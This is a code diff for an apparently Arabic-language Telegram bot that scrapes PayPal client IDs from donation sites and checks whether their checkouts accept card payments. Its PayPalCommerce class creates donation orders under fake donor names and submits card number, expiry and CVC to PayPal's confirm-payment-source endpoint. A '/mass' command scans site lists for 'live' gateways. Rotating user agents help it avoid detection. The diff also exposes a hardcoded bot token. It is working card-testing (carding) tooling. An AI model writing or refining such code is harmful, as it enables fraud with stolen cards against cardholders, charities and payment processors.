@@ -11,11 +11,16 @@ from user_agent import generate_user_agent
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urlparse
 from concurrent.futures import ThreadPoolExecutor, as_completed
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# === استيراد UserAgent مع fallback ===
 try:
     from fake_useragent import UserAgent
+    uu = UserAgent()
+    uu.random
     HAS_FAKE_UA = True
-except ImportError:
+except:
     HAS_FAKE_UA = False
     class SimpleUA:
         def __init__(self):
@@ -31,6 +36,7 @@ except ImportError:
         def random(self):
             return random.choice(self.agents)
 
+# === بيانات البوت ===
 token = '8407490230:AAEWWQvi_64s0BK5kGXn2XqU2DmYFqVx3lU'
 bot = telebot.TeleBot(token, parse_mode="HTML")
 admin = 6843321125
@@ -82,7 +88,12 @@ def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retrie
 def safe_send_message(chat_id, text, parse_mode="HTML", retries=3, reply_markup=None):
     for i in range(retries):
         try:
-            return bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
+            return bot.send_message(
+                chat_id,
+                text,
+                parse_mode=parse_mode,
+                reply_markup=reply_markup
+            )
         except Exception as e:
             if "429" in str(e):
                 try:
@@ -185,9 +196,15 @@ def feedback(call):
     Atty.add(back)
     YTT = f'''Welcome {userr} Send your message and the admin will respond.'''
     try:
-        bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=YTT, parse_mode='HTML', reply_markup=Atty)
-    except:
-        pass
+        bot.edit_message_text(
+            chat_id=call.message.chat.id,
+            message_id=call.message.message_id,
+            text=YTT,
+            parse_mode='HTML',
+            reply_markup=Atty
+        )
+    except Exception as e:
+        print(f"Feedback error: {e}")
     waiting_users[user_id] = True
 
 @bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
@@ -226,9 +243,10 @@ def back_to_start(call):
     FRA.add(Yes22)
     try:
         bot.edit_message_text(IU, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=FRA)
-    except:
-        pass
+    except Exception as e:
+        print(f"Back error: {e}")
 
+# ============ كلاس PayPalCommerce ============
 class PayPalCommerce:
     def __init__(self, target_url=None):
         self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
@@ -259,14 +277,14 @@ class PayPalCommerce:
     def _init_and_extract(self):
         try:
             headers = {'user-agent': self.uu.random, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.9'}
-            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers)
+            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
             self.cookies = dict(response.cookies)
             html = response.text
             self._extract_client_id(html)
             self._extract_form_data(html)
             self._extract_ajax_url(html)
-        except:
-            pass
+        except Exception as e:
+            print(f"Init error: {e}")
 
     def _extract_client_id(self, html):
         patterns = [r'client-id="([^"]+)"', r'client_id["\']?\s*[:=]\s*["\']([^"\']+)', r'data-client-id="([^"]+)"', r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})', r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)', r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)']
@@ -308,12 +326,12 @@ class PayPalCommerce:
             return None
         try:
             headers = {'user-agent': self.uu.random, 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded'}
-            response = self.r.post('https://api-m.paypal.com/v1/oauth2/token', headers=headers, data={'grant_type': 'client_credentials'}, auth=(self.client_id, ''))
+            response = self.r.post('https://api-m.paypal.com/v1/oauth2/token', headers=headers, data={'grant_type': 'client_credentials'}, auth=(self.client_id, ''), timeout=15)
             if response.status_code == 200:
                 self.access_token = response.json().get('access_token')
                 return self.access_token
-        except:
-            pass
+        except Exception as e:
+            print(f"Access token error: {e}")
         return None
 
     def _get_client_token(self):
@@ -324,7 +342,7 @@ class PayPalCommerce:
             for action in actions:
                 data = {'action': action, 'form-id': self.form_data.get('give-form-id', '')}
                 headers = {'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
-                response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies)
+                response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=10)
                 if response.status_code == 200 and response.text:
                     try:
                         json_data = response.json()
@@ -338,7 +356,8 @@ class PayPalCommerce:
                     except:
                         pass
             return None
-        except:
+        except Exception as e:
+            print(f"Client token error: {e}")
             return None
 
     def _create_order(self):
@@ -376,7 +395,7 @@ class PayPalCommerce:
         for action in actions:
             params = {'action': action}
             try:
-                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies)
+                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                 if response.status_code == 200 and response.text:
                     try:
                         json_data = response.json()
@@ -403,7 +422,7 @@ class PayPalCommerce:
         try:
             headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.uu.random, 'accept': 'application/json'}
             data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': 'USD', 'value': self.donation}}], 'application_context': {'shipping_preference': 'NO_SHIPPING', 'user_action': 'PAY_NOW'}}
-            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data)
+            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
             if response.status_code in [200, 201]:
                 response_data = response.json()
                 if 'id' in response_data:
@@ -436,7 +455,7 @@ class PayPalCommerce:
         for action in actions:
             params = {'action': action, 'order': order_id}
             try:
-                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies)
+                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                 if response.status_code == 200:
                     return response
             except:
@@ -468,7 +487,7 @@ class PayPalCommerce:
                 he4 = {'authorization': f'Bearer {auth_token}', 'paypal-client-metadata-id': self.client_id or '', 'user-agent': self.uu.random}
                 da3 = {'payment_source': {'card': {'number': n, 'expiry': expiry, 'security_code': cvc, 'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}}, 'application_context': {'vault': False}}
                 try:
-                    confirm_res = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=he4, json=da3)
+                    confirm_res = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=he4, json=da3, timeout=15)
                     if confirm_res.status_code == 200:
                         try:
                             confirm_json = confirm_res.json()
@@ -505,6 +524,7 @@ class PayPalCommerce:
         except Exception as e:
             return f"Error: {e}"
 
+# ============ أمر سحب PayPal ============
 @bot.message_handler(func=lambda m: m.text.lower().startswith('/paypal'))
 def ali_al2(massege):
     with open("blockusers.txt", "r") as file:
@@ -530,7 +550,7 @@ def ali_al2(massege):
             safe_edit_message(massege.chat.id, ko.message_id, "Invalid link format ❌")
             return
 
-        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"})
+        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
         if r.status_code != 200:
             safe_edit_message(massege.chat.id, ko.message_id, f"Site returned status: {r.status_code} ❌")
             return
@@ -689,6 +709,7 @@ if __name__ == '__main__':
     except:
         pass
 
+# ============ أمر mass ============
 @bot.message_handler(commands=['mass'])
 def mass_extract_start(message):
     with open("blockusers.txt", "r") as file:
@@ -773,6 +794,39 @@ def process_mass_file(message):
         
         if not status_msg:
             return
+
+        def update_status():
+            last_text = ""
+            while True:
+                time.sleep(10)
+                try:
+                    with processing_status[user_id]['lock']:
+                        if processing_status[user_id].get('done', False):
+                            break
+                        processed = processing_status[user_id]['processed']
+                        live = processing_status[user_id]['live']
+                        dead = processing_status[user_id]['dead']
+                        current_url = processing_status[user_id]['current_url']
+                        current_respons = processing_status[user_id]['current_respons']
+                        percent = int((processed / total) * 100) if total > 0 else 0
+                        bar_length = 20
+                        filled = int((percent / 100) * bar_length)
+                        bar = '█' * filled + '░' * (bar_length - filled)
+                        text = f"""📊 <b>File #1 - Scanning links...</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live: {live}\n❌ Dead: {dead}\n⏳ Progress: {percent}% {bar}\nUrl : <code>{current_url[:60] if current_url else '...'}</code>\nRespons : <code>{current_respons[:60] if current_respons else '...'}</code>\n━━━━━━━━━━━━━━━━━━\n⏱️ Checked {processed} of {total}\n🛑 /stop to stop"""
+                        
+                        if text != last_text:
+                            try:
+                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
+                                last_text = text
+                            except:
+                                pass
+                except:
+                    pass
+
+        updater = threading.Thread(target=update_status, daemon=True)
+        updater.start()
+
+        time.sleep(2)
 
         for idx, link in enumerate(links):
             if processing_status[user_id].get('stop_flag', False):
@@ -918,37 +972,22 @@ if __name__ == '__main__':
                             f.write(code)
                         safe_send_document(chat_id, file_name, caption=f"""✅ <b>Live Gateway #{live_idx}</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{result['link']}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Respons:</b> <code>{result['respons']}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @FAWZY30""")
                         os.remove(file_name)
-                        time.sleep(10)
+                        time.sleep(2)
                     except Exception as e:
                         print(f"Error sending file: {e}")
                 else:
                     processing_status[user_id]['dead'] += 1
                     processing_status[user_id]['current_respons'] = result.get('respons', 'Dead') if result else 'Dead'
             
-            # === تحديث فوري بعد كل موقع ===
-            try:
-                with processing_status[user_id]['lock']:
-                    processed = processing_status[user_id]['processed']
-                    live = processing_status[user_id]['live']
-                    dead = processing_status[user_id]['dead']
-                    current_url = processing_status[user_id]['current_url']
-                    current_respons = processing_status[user_id]['current_respons']
-                    percent = int((processed / total) * 100) if total > 0 else 0
-                    bar_length = 20
-                    filled = int((percent / 100) * bar_length)
-                    bar = '█' * filled + '░' * (bar_length - filled)
-                    text = f"""📊 <b>File #1 - Scanning links...</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live: {live}\n❌ Dead: {dead}\n⏳ Progress: {percent}% {bar}\nUrl : <code>{current_url[:50] if current_url else '...'}</code>\nRespons : <code>{current_respons[:50] if current_respons else '...'}</code>\n━━━━━━━━━━━━━━━━━━\n⏱️ Checked {processed} of {total}\n🛑 /stop to stop"""
-                    bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
-            except:
-                pass
-            
-            time.sleep(3)
+            time.sleep(2)
         
         with processing_status[user_id]['lock']:
             processing_status[user_id]['done'] = True
             processed = processing_status[user_id]['processed']
             live = processing_status[user_id]['live']
             dead = processing_status[user_id]['dead']
+        
+        updater.join(timeout=2)
         
         final_text = f"""📊 <b>✅ Complete!</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live (Sent): {live}\n❌ Dead: {dead}\n💯 Success Rate: {int((live/total)*100) if total > 0 else 0}%\n━━━━━━━━━━━━━━━━━━\nDev: @FAWZY30"""
         
@@ -996,13 +1035,7 @@ def unblock_user(message):
 
 # === تشغيل البوت ===
 print('✅ Bot is running...')
-while True:
-    try:
-        bot.infinity_polling(none_stop=True, interval=0, timeout=60, long_polling_timeout=60)
-    except Exception as e:
-        if "409" in str(e):
-            print("⏳ Conflict, waiting 10s...")
-            time.sleep(10)
-        else:
-            print(f'❌ Error: {e}')
-            time.sleep(5)
+try:
+    bot.infinity_polling(none_stop=True, interval=0, timeout=60, long_polling_timeout=60)
+except Exception as e:
+    print(f'❌ Error: {e}')
